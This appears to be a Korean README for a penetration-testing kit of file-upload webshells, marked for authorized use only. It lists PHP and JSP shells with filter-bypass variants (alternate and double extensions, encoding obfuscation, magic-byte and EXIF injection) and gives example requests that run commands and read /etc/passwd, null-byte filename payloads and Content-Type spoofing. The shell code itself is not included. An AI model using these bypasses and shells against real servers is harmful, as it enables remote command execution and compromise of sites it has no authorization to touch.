# File Upload Webshell Cheatset

> 취약점 진단 전용 - 인가된 환경에서만 사용

---

## 디렉토리 구조

```
cheetset/
├── sh.php                     # PHP 웹쉘 (인증 포함, 범용)
├── sh.jsp                     # JSP 웹쉘 (인증 포함, OS 자동감지)
│
├── bypass_ext/                # 확장자 우회
│   ├── sh.php3/4/5            # 구버전 PHP 확장자
│   ├── sh.phtml               # PHP HTML 확장자
│   ├── sh.phar                # PHP Archive
│   ├── sh.shtml               # SSI 인젝션
│   ├── sh.jspx                # JSP XML 포맷
│   ├── sh.PhP                 # 대소문자 혼합 (대소문자 미구분 서버)
│   ├── sh.php.jpg             # 이중 확장자 (끝 확장자 기준 차단)
│   └── sh.jpg.php             # 이중 확장자 (끝 확장자 기준 실행)
│
├── bypass_encoding/           # 인코딩/난독화 우회
│   ├── sh_base64.php          # base64_decode로 함수명 숨김
│   ├── sh_concat.php          # 문자열 연결로 함수명 조합
│   ├── sh_hex.php             # \x 헥스 인코딩
│   ├── sh_eval.php            # eval + base64 이중 인코딩
│   ├── sh_rot13.php           # str_rot13 난독화
│   └── sh_gzip.php            # gzcompress + base64
│
├── bypass_size/               # 파일 크기 우회
│   ├── sh_padded.php          # 최소 크기 우회용 패딩 추가
│   └── sh_exif_jpg.php        # EXIF 헤더 + PHP 코드 삽입
│
└── bypass_content/            # 파일 내용/Magic bytes 우회
    ├── sh_gif_magic.php       # GIF89a 매직바이트 앞에 삽입
    ├── sh_png_magic.php       # PNG 시그니처 삽입
    ├── sh_pdf_magic.php       # %PDF 시그니처 삽입
    └── sh_zip_magic.php       # PK 시그니처 삽입
```

---

## 사용법

### sh.php
```
GET /upload/sh.php?auth=pentest123&cmd=id
GET /upload/sh.php?auth=pentest123&read=/etc/passwd
```

### sh.jsp
```
GET /upload/sh.jsp?auth=pentest123&cmd=id
GET /upload/sh.jsp?auth=pentest123&cmd=whoami
GET /upload/sh.jsp?auth=pentest123&read=/etc/passwd
```

---

## 우회 기법 정리

| 기법 | 대상 | 파일 |
|------|------|------|
| 대체 확장자 | 확장자 블랙리스트 | .php3/4/5, .phtml, .phar |
| 대소문자 | 대소문자 구분 없는 필터 | .PhP |
| 이중 확장자 | 마지막 점 기준 파싱 차이 | .php.jpg / .jpg.php |
| Magic Bytes | Content-Type/시그니처 검사 | GIF89a, %PDF, PNG 헤더 |
| EXIF 삽입 | 이미지 유효성 검사 | JPEG EXIF 헤더 포함 |
| 크기 패딩 | 최소 파일 크기 제한 | 주석으로 크기 부풀리기 |
| Base64/Hex | 정적 키워드 필터 | system → base64/hex |
| 문자열 연결 | 정적 분석 우회 | 'sys'.'tem' |
| eval+gzip | WAF 시그니처 우회 | gzcompress payload |

---

## Null Byte 우회 (버프스위트 수동)

PHP 5.3 이하에서 유효:
```
sh.php%00.jpg
sh.php%zz.jpg
sh.php;,.jpg
```
파일명 파라미터를 인터셉트 후 URL 디코드된 `\x00` 삽입

---

## Content-Type 우회 (버프스위트)

요청 헤더 변조:
```
Content-Type: image/jpeg   ← 변조
```
실제 파일은 PHP 코드 유지
